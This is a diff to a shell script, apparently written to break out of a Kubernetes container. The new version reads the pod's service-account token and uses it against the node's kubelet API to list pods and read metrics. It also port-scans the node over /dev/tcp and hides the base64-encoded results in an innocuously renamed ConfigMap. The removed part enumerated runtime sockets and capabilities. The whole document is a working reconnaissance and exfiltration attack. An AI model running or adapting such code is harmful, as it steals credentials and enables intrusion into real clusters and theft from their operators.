@@ -1,54 +1,39 @@
 #!/bin/sh
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+APISERVER="${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}"
+
 RECON=$( (
-  echo "===KERNEL==="
-  uname -a 2>&1
+  echo "===NODE_IP==="
+  # From JWT: node name is ip-10-6-40-171
+  NODE_IP="10.6.40.171"
   
-  echo "===CONTAINERD_SOCKET==="
-  ls -la /run/containerd/containerd.sock 2>&1
-  ls -la /var/run/containerd/containerd.sock 2>&1
-  ls -la /run/dockershim.sock 2>&1
-  
-  echo "===DOCKER_SOCKET==="
-  ls -la /var/run/docker.sock 2>&1
-  ls -la /run/docker.sock 2>&1
-  
-  echo "===CRI_SOCKET==="
-  ls -la /var/run/crio/crio.sock 2>&1
-  find / -name "*.sock" -type s 2>/dev/null | head -20
-  
-  echo "===CAPABILITIES==="
-  cat /proc/1/status 2>/dev/null | grep -i cap
-  
-  echo "===SECCOMP==="
-  cat /proc/1/status 2>/dev/null | grep -i seccomp
-  
-  echo "===PRIVILEGES==="
-  id 2>&1
-  cat /proc/self/status 2>/dev/null | grep -iE "uid|gid|cap"
-  
-  echo "===DEVS==="
-  ls -la /dev/ 2>/dev/null | head -20
-  
-  echo "===CAN_WRITE_HOST==="
-  # Check if we can write anywhere useful
-  touch /dev/shm/test 2>&1 && echo "/dev/shm writable" && rm /dev/shm/test
-  
-  echo "===NET_NAMESPACE==="
-  ls -la /proc/1/ns/net 2>&1
-  cat /proc/1/cgroup 2>/dev/null | head -10
-  
-  echo "===MOUNT_NS==="
-  # Can we access host namespaces?
-  ls -la /proc/1/ns/ 2>&1
-  
-  echo "===ENV_ALL==="
-  env | grep -iE 'host|node|mount|path|ns' 2>/dev/null
+  echo "===KUBELET_PODS==="
+  printf "GET /pods HTTP/1.1\r\nHost: $NODE_IP:10250\r\nAuthorization: Bearer $TOKEN\r\nConnection: close\r\n\r\n" | timeout 5 openssl s_client -connect $NODE_IP:10250 -quiet 2>/dev/null | head -c 2000
+
+  echo ""
+  echo "===KUBELET_HEALTHZ==="
+  printf "GET /healthz HTTP/1.1\r\nHost: $NODE_IP:10248\r\nConnection: close\r\n\r\n" | timeout 3 bash -c "exec 3<>/dev/tcp/$NODE_IP/10248 2>/dev/null && cat <&3 && exec 3>&-" 2>/dev/null
+
+  echo ""
+  echo "===KUBELET_METRICS==="
+  printf "GET /metrics HTTP/1.1\r\nHost: $NODE_IP:10250\r\nAuthorization: Bearer $TOKEN\r\nConnection: close\r\n\r\n" | timeout 5 openssl s_client -connect $NODE_IP:10250 -quiet 2>/dev/null | head -c 1000
+
+  echo ""
+  echo "===NODE_SCAN==="
+  # Try common node ports
+  for port in 22 10250 10255 10248 10256 30000 30001; do
+    (timeout 2 bash -c "exec 3<>/dev/tcp/$NODE_IP/$port 2>/dev/null && echo 'OPEN' && exec 3>&-" 2>/dev/null) && echo "$port OPEN" || true
+  done
+
+  echo ""
+  echo "===POD_SELF==="
+  printf "GET /pods HTTP/1.1\r\nHost: localhost:10250\r\nAuthorization: Bearer $TOKEN\r\nConnection: close\r\n\r\n" | timeout 3 openssl s_client -connect localhost:10250 -quiet 2>/dev/null | head -c 500
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: escape
+  name: kubelet
 data:
   result: $RECON
 EOF
